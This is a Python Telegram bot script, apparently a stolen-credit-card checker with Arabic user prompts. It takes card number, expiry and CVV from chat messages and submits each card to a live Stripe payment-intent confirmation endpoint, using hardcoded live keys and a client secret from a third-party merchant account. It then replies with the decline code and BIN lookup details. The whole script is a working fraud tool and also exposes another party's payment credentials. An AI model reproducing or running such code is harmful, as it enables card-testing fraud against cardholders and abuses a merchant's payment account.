try:
	import telebot
	import requests
	from time import sleep
	from os import system
except:
	system('pip install pyTelegramBotAPI==3.7.7')
	system('pip install mechanize')
	system('pip install PyTelegramBotApi')
	system('pip install requests')
token=input('Aenter TOKEN : ')
bot=telebot.TeleBot(token)
@bot.message_handler(commands=['start'])
def start(message):
	l=message.from_user.first_name
	j=message.from_user.username
	bot.send_message(message.chat.id, 'ارسل الان الفيزه بدون اي شيء معها')
	
	
	@bot.message_handler(func=lambda message:True)
	def yahya(message):
		
		try:
			bin=(message.text)
			number=bin.split('|')[0]
			exp=bin.split('|')[1]
			exp1=bin.split('|')[2]
			cvv=bin.split('|')[3]
			g=exp1[2]
			i=exp1[3]
			f=f'{g}{i}'
			url='https://api.stripe.com/v1/payment_intents/pi_3M83xDPbdlN1SVrR0nvCS1OE/confirm'
			head={
'user_agent':'Mozilla/5.0 (Linux; Android 12; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}
			data={
f'setup_future_usage':'off_session','payment_method_data[type]':'card','payment_method_data[card][number]':f'{number}','payment_method_data[card][cvc]':f'{cvv}','payment_method_data[card][exp_month]':f'{exp}','payment_method_data[card][exp_year]':f'{f}','payment_method_data[guid]':'d61b8d85-b4bc-4644-9cc0-8213d31e84d7fa9c56','payment_method_data[muid]':'c1afae11-300e-42b8-9ca5-d585535adb366c5877','payment_method_data[sid]':'9e21ad36-e605-4faa-9cb1-ab00464f01eee8cc6a','payment_method_data[pasted_fields]':'number','payment_method_data[payment_user_agent]':'stripe.js%2F185ad2604%3B+stripe-js-v3%2F185ad2604','payment_method_data[time_on_page]':'573234','expected_payment_method_type':'card','use_stripe_sdk':'true','key':'pk_live_51HbsUNBP9OQuEIrPQTov2wZCQlEOC0EniZrH71zXu970tAaLxliYcvffDyHgP3wO9xrKbrfY4TGDVgViEUjwQ4mL00oKOvo8WJ','_stripe_account':'acct_1JxFYCPbdlN1SVrR','client_secret':'pi_3M83xDPbdlN1SVrR0nvCS1OE_secret_OGOBmZkvN6OcbgwY0dneHI5ot'
}
			req=requests.post(url,headers=head,data=data).json()
			i=req['error']['message']
			k=req['error']['code']
			url=f'https://lookup.binlist.net/{number}'
			head={'user_agent':'Mozilla/5.0 (Linux; Android 11; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'}
			req=requests.get(url,headers=head).json()
			ii=req['scheme']
			uu=req['type']
			br=req['brand']
			dd=req['country']['name']
			jj=req['country']['emoji']
			bot.reply_to(message,f'cc:{bin}\nmessage :{i}\ncode :{k}\n----------BIN INFO ----------\n✯ 𝙱𝙸𝙽 : {number}\n✯ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈 : {dd} {jj}\n✯ 𝙽𝙴𝚃𝚆𝙾𝚁𝙺 : {ii}\n✯ 𝙱𝚁𝙰𝙽𝙳 : {br}\n✯ ᴛʏᴘᴇ : {uu}\n⚊ ⚊ ⚊ ⚊ ⚊ ⚊ ⚊ ⚊ ⚊\nchecked by :@{j}\ndevloper :yahya almshhadny')
			bot.send_message(message.chat.id,'ارسل الاخر')
		except:
			bot.send_message(message.chat.id,'حدث خطا ما اعد المحاولة')
			
		

		

bot.polling(True)